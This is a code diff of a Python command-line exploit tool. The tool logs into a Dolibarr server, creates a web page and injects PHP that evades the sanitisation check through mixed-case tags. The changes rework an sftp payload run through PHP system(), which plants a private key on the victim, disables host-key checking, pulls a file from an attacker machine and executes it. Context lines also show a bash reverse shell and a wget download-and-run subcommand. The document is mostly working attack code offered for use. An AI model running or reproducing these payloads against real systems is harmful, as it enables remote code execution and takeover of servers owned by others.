@@ -1,4 +1,6 @@
+from typing import Literal, TextIO, Union
 import uuid
+
 import cloup
 from furl import furl
 
@@ -7,21 +9,31 @@ from .exploit import Exploit
 
 
 @cloup.group()
-@cloup.argument("target_url")
-@cloup.argument("username")
-@cloup.argument("password")
+@cloup.argument("target_url", type=cloup.STRING)
+@cloup.argument("username", type=cloup.STRING)
+@cloup.argument("password", type=cloup.STRING)
 @cloup.option(
     "--site-name",
+    type=cloup.STRING,
     help="Specify a name to use when creating a site on the target. Defaults to UUIDv4.",
 )
 @cloup.option(
     "--page-name",
+    type=cloup.STRING,
     help="Specify a name to use when creating a page on the target. Defaults to UUIDv4.",
 )
 @cloup.option(
-    "--page-title", help="Specify a title for the page. Defaults to the page name."
+    "--page-title",
+    type=cloup.STRING,
+    help="Specify a title for the page. Defaults to the page name.",
 )
-@cloup.option("--proxy", help="Specify a proxy URL for use in all requests.")
+@cloup.option("--proxy", type=str, help="Specify a proxy URL for use in all requests.")
+@cloup.option(
+    "-o",
+    "--output",
+    type=cloup.File(mode="w", lazy=True),
+    help="Specify a file path to output the results of the payload to. Defaults to stdout.",
+)
 @cloup.pass_context
 def cli(
     context: cloup.Context,
@@ -32,18 +44,9 @@ def cli(
     page_name: str | None = None,
     page_title: str | None = None,
     proxy: str | None = None,
+    output: TextIO | None = None,
 ) -> None:
     """This exploit will log into the Dolibarr web server at the specified target URL with the provided username and password. After that it will attempt to create a web page with a unique name. Once created, it will modify the web page to include the custom PHP code bypassing the sanitation check by not using only lowercase letters (e.g. PHP or pHp instead of php). There are multiple payloads to choose from After the payload has finished running, the web page will be deleted."""
-    log.info(
-        "CLI started",
-        target_url=target_url,
-        username=username,
-        password=password,
-        site_name=site_name,
-        page_name=page_name,
-        page_title=page_title,
-        proxy=proxy,
-    )
     try:
         parsed_url = furl(target_url, strict=True)
     except Exception as error:
@@ -67,6 +70,7 @@ def cli(
         page_name=page_name,
         page_title=page_title,
         proxy=parsed_proxy,
+        output=output,
     )
 
 
@@ -111,15 +115,19 @@ def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
 )
 @cloup.argument(
     "attacker_source",
+    type=cloup.STRING,
     help="May be specified as user@host:path or as a URI in the form sftp://user@host[:port]/path. This should point to the attacker machine and the file you want to download.",
 )
 @cloup.argument(
     "victim_destination",
-    help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed.",
+    type=cloup.Path(exists=False),
+    help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed (e.g. ./linpeas).",
 )
+@cloup.option("--args", type=None)
 @cloup.constraints.mutually_exclusive(
     cloup.option(
         "--private-key-file",
+        type=cloup.File(mode="r"),
         help="Provide a path to a private key file to be used to log into the attacker machine from the victim machine.",
     ),
     cloup.option(
@@ -128,26 +136,52 @@ def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
         help="Provide a private key file's contents as a string to be used to log into the attacker machine from the victim machine.",
     ),
 )
+@cloup.option(
+    "--key-filepath",
+    type=cloup.Path(exists=False),
+    help="The filepath including the name that the private key will be temporarily stored on the target's disk as (defaults to ./<uuidv4>.key).",
+)
+@cloup.option(
+    "--key-usage",
+    type=cloup.Choice(("disk", "stdin"), case_sensitive=True),
+    help="Choose how the private key will be used. Disk, the default option, stores the key on the target's disk temporarily and deletes it at the end of the payload. Stdin will pass the key to sftp via stdin avoiding putting it on disk, but this may not work on some machines (I believe it's when libcrypto was built with no-stdio).",
+)
 @cloup.pass_context
 def sftp(
     context: cloup.Context,
     attacker_source: str,
     victim_destination: str,
-    private_key_file: str | None,
+    private_key_file: TextIO | None,
     private_key_contents: str | None,
+    key_filepath: str | None,
+    key_usage: Union[Literal["disk"], Literal["stdin"]],
 ) -> None:
     private_key: str = ""
     if private_key_file is not None:
-        with open(private_key_file, "r") as file:
-            private_key = file.read()
-    if private_key_contents is not None:
+        private_key = private_key_file.read()
+    elif private_key_contents is not None:
         private_key = private_key_contents
-    if len(private_key) <= 0:
+    if len(private_key.strip()) <= 0:
         raise ValueError("The private key you supplied was empty.")
+    private_key = private_key.replace("\n", "\\n")
+
+    if key_filepath is None:
+        key_filepath = f"./{uuid.uuid4().hex}.key"
+
+    if key_usage == "disk" or key_usage is None:
+        write_key = (
+            f"echo '{private_key}\\n' > {key_filepath} && chmod 600 {key_filepath} &&"
+        )
+        use_key = key_filepath
+        key_cleanup = f"rm {key_filepath}"
+    elif key_usage == "stdin":
+        write_key = f"echo '{private_key} |"
+        use_key = "/dev/stdin"
+        key_cleanup = ""
 
     return context.obj.run(
         php_system(
-            f'echo "{private_key}" | sftp -i /dev/stdin {attacker_source} {victim_destination} && chmod u+x {victim_destination} && {victim_destination}; rm {victim_destination}'
+            f"{write_key} sftp -i {use_key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {attacker_source} {victim_destination} 2>&1 && chmod u+x {victim_destination} && echo 'Starting {victim_destination}' && {victim_destination} 2>&1; rm {victim_destination}; {key_cleanup}"
         )
     )
 
@@ -158,7 +192,7 @@ def sftp(
 @cloup.argument("source_url", help="The URL of the file to download.")
 @cloup.argument(
     "victim_destination",
-    help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed.",
+    help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed (e.g. ./linpeas).",
 )
 @cloup.pass_context
 def wget(context: cloup.Context, source_url: str, victim_destination: str) -> None:
@@ -170,6 +204,7 @@ def wget(context: cloup.Context, source_url: str, victim_destination: str) -> No
 
 
 def php_system(payload: str) -> str:
+    """Wraps the payload in a `system("");` call. Also warns when double quotes are included in the payload."""
     if '"' in payload:
         log.warning(
             "You included a double quote (\") in your payload. Please try to avoid this as the entire command will be encased in double quotes to be run by PHP's system function.",
